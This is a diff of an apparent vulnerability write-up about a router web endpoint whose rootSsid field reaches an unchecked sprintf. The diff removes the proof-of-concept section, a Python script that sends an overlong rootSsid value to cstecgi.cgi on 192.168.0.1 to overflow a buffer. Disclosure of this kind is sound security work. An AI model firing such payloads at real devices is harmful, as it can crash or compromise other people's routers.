@@ -38,39 +38,5 @@ sprintf((char *)v36, "%s_5G", v58);  // v58 = rootSsid
 
 # POC
 
-```http
-import requests
-import json
-url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
-headers = {
-    "Host": "192.168.0.1",
-    "X-Requested-With": "XMLHttpRequest",
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0",
-    "Accept": "*/*",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Origin": "http://192.168.0.1",
-    "Referer": "http://192.168.0.1/internet/ipv6_wan.asp?timestamp=1768535405207",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-    "Cookie": "SESSION_ID=2:1768535901:2",
-    "Connection": "keep-alive",
-}
-
-repeat="A" * 5000
-data = {
-    "topicurl": "setting/setAppEasyWizardConfig",
-    "functionType": "2",
-    "rootFlag": "1",
-    "rootSsid": repeat,
-}
-
-payload = json.dumps(data)
-response = requests.post(url, headers=headers, data=data, timeout=10)
-print(response.status_code)
-for k, v in response.headers.items():
-    print(f"{k}: {v}")
-print(response.text)
-```
-
 ![image-20260116160228893](rootSsid-setAppEasyWizardConfig.assets/image-20260116160228893.png)
 
